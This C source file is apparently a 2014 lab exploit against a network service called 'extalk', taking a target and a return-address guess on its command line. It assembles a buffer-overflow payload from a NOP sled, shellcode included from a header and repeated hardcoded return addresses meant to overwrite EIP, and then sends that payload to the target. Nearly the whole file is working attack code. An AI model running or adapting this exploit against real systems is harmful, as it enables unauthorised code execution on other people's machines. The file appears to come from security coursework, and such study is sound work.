// Robert Baykov <baykovr@gmail.com>
// November 2014

#include "extalk.h"
#include "scan.h"

//-----------------------------------------------------------------------------
#define EXTALK_DBG   0
#define SHELL_OFFSET 768 //mutliples of 8 was 16 : 896

#define EIP_OFFSET   128
//payloadsize def in scan.h
//total payload size, min for buffer overflow of 116

//-----------------------------------------------------------------------------
void flip_len(char *cp, int len)
{
    int i;
    for(i=0;i<len;i+=2)
    {   
        if(cp[i] && cp[i+1])
        {   
            char ch = cp[i];
            cp[i] = cp[i+1];
            cp[i+1] = ch; 
        }   
    }   
}
//-----------------------------------------------------------------------------
void flip(char *cp)
{
    int i;
    for(i=0;i<strlen(cp);i+=2)
    {   
        if(cp[i] && cp[i+1])
        {   
            char ch = cp[i];
            cp[i] = cp[i+1];
            cp[i+1] = ch; 
        }   
    }   
}
//-----------------------------------------------------------------------------
void reverse(char *cp)
{
    int i;
    for(i=0;i<strlen(cp)/2;i++)
    {
        char ch = cp[i];
        cp[i] = cp[strlen(cp)-1-i];
        cp[strlen(cp)-1-i] = ch;
    }
}
//-----------------------------------------------------------------------------
int main(int argc,char**argv)
{	
    if(argc < 3)
    {
        printf("usage %s [target] [eip-guess]\n",argv[0]);
        exit(0);
    }

    unsigned char payload[PAYLOAD_SIZE];
    int i;

    // Fill payload with nops
    memset(payload, 0x90, PAYLOAD_SIZE);
    if(EXTALK_DBG)
    {
        printf("\nSHELL CODE\n");
        for(i=0;i<SHELL_SIZE; i++)
            {printf("%x",shellcode[i]);}
        printf("\n\n");
    }

    // Fill shellcode
    for(i = SHELL_OFFSET; i< SHELL_SIZE+SHELL_OFFSET; i++)
    {
        payload[i] = shellcode[i-SHELL_OFFSET];
    }
    
    // Write %eip (a lot)
    for(i = 0; i< EIP_OFFSET; i=i+4)
    {
        if( i+1 > PAYLOAD_SIZE){break;}

	payload[i]   = 0x88; //88
        payload[i+1] = 0xf3;
        payload[i+2] = 0xff; //
        payload[i+3] = 0xbf;

	// w/gdb bf ff f2 60
	// w/0   bf ff f2 70
	//group1 : bf ff f3 88
    }
    if(EXTALK_DBG)
    {
        printf("\nFINAL PAYLOAD\n");
        for(i=0;i<PAYLOAD_SIZE;i++)
        {
            printf("%x",payload[i]);
            //printf("[%d] %x\n",i,payload[i]);
        }   
        printf("\n\n");
    }

    printf("[<<<<] sending payload of size %d\n", sizeof(payload));
      
	scan(argv[1],payload);

   
exit(0); //hackityhack
}
